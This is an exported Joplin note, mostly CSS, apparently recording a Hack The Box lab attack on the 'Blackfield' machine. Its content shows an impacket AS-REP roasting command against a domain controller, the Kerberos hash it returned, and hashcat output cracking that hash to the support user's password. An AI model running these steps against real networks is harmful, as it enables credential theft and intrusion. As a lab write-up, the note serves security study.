@@ -1,0 +1,2269 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Blackfield</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Blackfield</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="blackfield">Blackfield</h2>
+<p>---&gt; support user is AS-REP Roastable</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ impacket-GetNPUsers -usersfile usernames_formatted.txt -request -format hashcat -dc-ip 10.129.229.17 &quot;blackfield.local/&quot;
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User audit2020 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$support@BLACKFIELD.LOCAL:bdd58fae435631e894cf27a259153bed$e238f2781d945729a23f62b04f5d4d70a5fe7d032620f8051bae50a1fa4319efb8e45220bf9fa7b6261e5b5e85752ded4de7f50c15e82e4628dd0cc796f8e65c28cc8fc50ed1920bcefd026344156bdd6e2a88a984a6e5fb688ae7702a18e27b860e1388b6130330f574646540b28d667bb74c9fe1b335e1cb5fe42a63ca0810895c3d3cdd052cb685628ea65ef4b8eeef364449dfaad949ac0c03082530cd51f688f007dadc7ea444758fb506b0f2b8b0c1738cf22553890ec44789cba33587c3a3e259948b1d6429d13d032b8d606d8bbe48316b3ec64d85d22eff7c836a5eb8a69f96df14d699f1862be2ba4609f0ba259f51
+[-] User BLACKFIELD764430 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User BLACKFIELD538365 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User BLACKFIELD189208 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ impacket-GetNPUsers -usersfile usernames_formatted.txt -request -format hashcat -dc-ip 10.129.229.17 &quot;blackfield.local/&quot;
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User audit2020 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$support@BLACKFIELD.LOCAL:bdd58fae435631e894cf27a259153bed$e238f2781d945729a23f62b04f5d4d70a5fe7d032620f8051bae50a1fa4319efb8e45220bf9fa7b6261e5b5e85752ded4de7f50c15e82e4628dd0cc796f8e65c28cc8fc50ed1920bcefd026344156bdd6e2a88a984a6e5fb688ae7702a18e27b860e1388b6130330f574646540b28d667bb74c9fe1b335e1cb5fe42a63ca0810895c3d3cdd052cb685628ea65ef4b8eeef364449dfaad949ac0c03082530cd51f688f007dadc7ea444758fb506b0f2b8b0c1738cf22553890ec44789cba33587c3a3e259948b1d6429d13d032b8d606d8bbe48316b3ec64d85d22eff7c836a5eb8a69f96df14d699f1862be2ba4609f0ba259f51
+[-] User BLACKFIELD764430 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User BLACKFIELD538365 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User BLACKFIELD189208 doesn&apos;t have UF_DONT_REQUIRE_PREAUTH set</code></pre></div>
+<p>----&gt; Password of support user is #00^BlackKnight</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">$krb5asrep$23$support@BLACKFIELD.LOCAL:bdd58fae435631e894cf27a259153bed$e238f2781d945729a23f62b04f5d4d70a5fe7d032620f8051bae50a1fa4319efb8e45220bf9fa7b6261e5b5e85752ded4de7f50c15e82e4628dd0cc796f8e65c28cc8fc50ed1920bcefd026344156bdd6e2a88a984a6e5fb688ae7702a18e27b860e1388b6130330f574646540b28d667bb74c9fe1b335e1cb5fe42a63ca0810895c3d3cdd052cb685628ea65ef4b8eeef364449dfaad949ac0c03082530cd51f688f007dadc7ea444758fb506b0f2b8b0c1738cf22553890ec44789cba33587c3a3e259948b1d6429d13d032b8d606d8bbe48316b3ec64d85d22eff7c836a5eb8a69f96df14d699f1862be2ba4609f0ba259f51:#00^BlackKnight
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:bdd58fae4356...259f51</pre><pre class="hljs"><code>$krb5asrep$<span class="hljs-number">23</span>$support@BLACKFIELD.<span class="hljs-built_in">LOCAL</span>:bdd58fae435631e894cf27a259153bed$e238f2781d945729a23f62b04f5d4d70a5fe7d032620f8051bae50a1fa4319efb8e45220bf9fa7b6261e5b5e85752ded4de7f50c15e82e4628dd0cc796f8e65c28cc8fc50ed1920bcefd026344156bdd6e2a88a984a6e5fb688ae7702a18e27b860e1388b6130330f574646540b28d667bb74c9fe1b335e1cb5fe42a63ca0810895c3d3cdd052cb685628ea65ef4b8eeef364449dfaad949ac0c03082530cd51f688f007dadc7ea444758fb506b0f2b8b0c1738cf22553890ec44789cba33587c3a3e259948b1d6429d13d032b8d606d8bbe48316b3ec64d85d22eff7c836a5eb8a69f96df14d699f1862be2ba4609f0ba259f51:#00^BlackKnight
+                                                          
+Session<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.: hashcat
+Status<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..: Cracked
